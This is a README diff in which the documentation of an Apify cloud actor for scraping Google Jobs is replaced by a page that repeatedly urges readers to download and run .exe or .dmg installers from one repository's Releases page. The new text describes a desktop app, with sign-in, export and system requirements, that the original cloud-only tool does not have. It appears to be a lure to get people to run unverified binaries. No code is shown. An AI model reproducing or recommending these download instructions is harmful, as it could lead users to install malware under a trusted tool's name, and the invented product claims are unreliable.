@@ -1,82 +1,81 @@
-# Apify - Google Jobs Scraper
+# 🌍 Apify-Google-Jobs-Scraper - Uncover Global Job Opportunities Effortlessly
 
-https://apify.com/orgupdate/google-jobs-scraper
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/releases)
 
-## Overview
+## 🚀 Getting Started
 
-The **Google Jobs Scraper** is a powerful tool designed to scrape and aggregate job listings from multiple sources. Whether you're building a job portal, conducting market research, or tracking employment trends, this actor provides structured job data in real time.
+Welcome to the Apify Google Jobs Scraper! This tool helps you gather real-time job postings from Google Jobs easily. Whether you are a job seeker, recruiter, or researcher, this application is designed for you. Follow these simple steps to get started.
 
-## Features
+## 📥 Download & Install
 
-- ✅ **Multi-Source Scraping** – Collect job listings from multiple job boards and career pages.  
-- 🔍 **Advanced Filtering** – Search by industry, location, company, and keywords.  
-- 📅 **Real-Time Data** – Fetch the latest job postings as they appear.  
-- 🏷️ **Structured Output** – Get clean JSON data with job titles, descriptions, salaries, and more.  
-- 🚀 **Fast & Scalable** – Optimized for speed and large-scale data collection.  
+1. **Visit the Release Page**  
+   Go to our official [Releases page](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/releases) to find the latest version of the scraper.
 
-## Use Cases
+2. **Choose the Right Version**  
+   Look for the version marked as "Latest." You will see several files available for download. Select the file appropriate for your operating system.
 
-- **Job Aggregators** – Power your job board with fresh listings.  
-- **Recruitment Agencies** – Find and analyze hiring trends.  
-- **Market Research** – Track job demand across industries.
+3. **Download the File**  
+   Click on the file link to start downloading. Make sure to save this file in a location you can easily access later.
 
-## Input Parameters
+4. **Install the Application**  
+   - **For Windows Users:** Double-click the downloaded `.exe` file. Follow the on-screen prompts to complete the installation.
+   - **For Mac Users:** Locate the downloaded `.dmg` file. Open it and drag the Apify icon to your Applications folder.
+   - **For Linux Users:** Follow the provided installation instructions in the release notes for your distribution.
 
-| Parameter           | Type    | Description |
-|--------------------|--------|-------------|
-| `countryName`     | String | Select the country for job search. Default: "all". |
-| `companyName`     | String | (Optional) Enter the company name to filter job listings. |
-| `locationName`    | String | (Optional) Enter the city or region. |
-| `includeKeyword`  | String | (Optional) Comma-separated keywords (e.g., React, Next.js, remote, part time). |
-| `pagesToFetch`    | Integer | Number of pages to scrape. Minimum: 1. Default: 1. |
-| `last`          | String | Value can be "all", "24h", "48h" or "72h". Default: "all". |
+5. **Open the Application**  
+   After installation, find the Apify Google Jobs Scraper icon on your application list. Click to launch the application.
 
-### Example Input:
+## 🔍 How to Use the Scraper
 
-```json
-{
-  "countryName": "usa",
-  "companyName": "google",
-  "locationName": "new york",
-  "includeKeyword": "python, django",
-  "pagesToFetch": 2,
-}
-```
+1. **Sign In or Create an Account**  
+   When you first open the app, you may need to sign in or create an account. Follow the prompts to start.
 
-## Output Format
+2. **Select Your Keywords**  
+   Enter the job titles or keywords you want to search for. This will help the scraper gather relevant job postings.
 
-The actor returns structured job listings in JSON format:
+3. **Set Search Preferences**  
+   You can choose specific locations, job types, or company names to refine your search results. Make sure to adjust these settings according to your needs.
 
-```json
-[
-  {
-    "job_title": "Frontend Developer",
-    "company_name": "Tech Corp",
-    "location": "Remote",
-    "posted_via": "LinkedIn",
-    "salary": "$75,000 - $90,000",
-    "date": "2025-03-25",
-    "URL": "https://example.com/job/frontend-dev"
-  }
-]
-```
+4. **Run the Scraper**  
+   Click on the "Start Scraping" button. The scraper will begin to collect job postings based on your preferences.
 
-## How to Use
+5. **View Results**  
+   Once scraping is complete, you will see a list of job postings. You can review them directly in the app.
 
-1. **Deploy on Apify** – Run the actor directly from the Apify platform.  
-2. **Schedule & Automate** – Set up periodic runs to keep your job database updated.  
-3. **Export Data** – Integrate with your CRM, website, or analytics platform.  
+6. **Export Data**  
+   If you need the results in a specific format, use the "Export" feature. You can often choose from CSV or Excel formats for easy analysis.
 
-## Why Use This Actor?
+## ✅ System Requirements
 
-- **No Coding Required** – Easy-to-use with minimal setup.  
-- **Saves Time** – Automates job data collection.  
-- **Customizable** – Supports tailored scraping configurations.  
+To run the Apify Google Jobs Scraper smoothly, please ensure your system meets the following requirements:
 
-## Get Started
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any modern Linux distribution.
+- **RAM:** At least 2 GB of RAM.
+- **Storage:** 500 MB of free disk space.
+- **Internet Connection:** Required for scraping job postings.
 
-1. Sign up on [Apify](https://apify.com/).  
-2. Search for **Google Jobs Scraper**.  
-3. Enter your search parameters and run the actor.  
+## ⚙️ Features
 
-Start collecting job data effortlessly! Acquire market intelligence faster with real-time global job postings 🚀
+- **Real-Time Job Extraction:** Get the latest job postings as they appear on Google Jobs.
+- **Multi-Keyword Search:** Find listings across various job titles and regions.
+- **Export Options:** Easily export data in CSV or Excel formats.
+- **User-Friendly Interface:** Designed for users with no technical background.
+- **Regular Updates:** Stay up-to-date with new features and improvements.
+
+## 🌐 Support and Community
+
+If you have questions or face issues, our community is here to help. You can find support through:
+
+- **GitHub Issues:** Report any bugs or request features [here](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/issues).
+- **Documentation:** Access detailed guides and FAQs on the [Wiki section](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/wiki).
+- **User Community:** Join discussions and share tips with other users on our forums.
+
+## 🔗 Additional Resources
+
+For more details and to explore further, visit our project's [GitHub page](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper) for updates and documentation.
+
+### 📄 License
+
+This project is licensed under the MIT License. You can freely use and modify the software while following the terms of this license.
+
+Remember to check back often for new releases. Download the Apify Google Jobs Scraper today from our [Releases page](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/releases) and start uncovering job opportunities all around the globe!
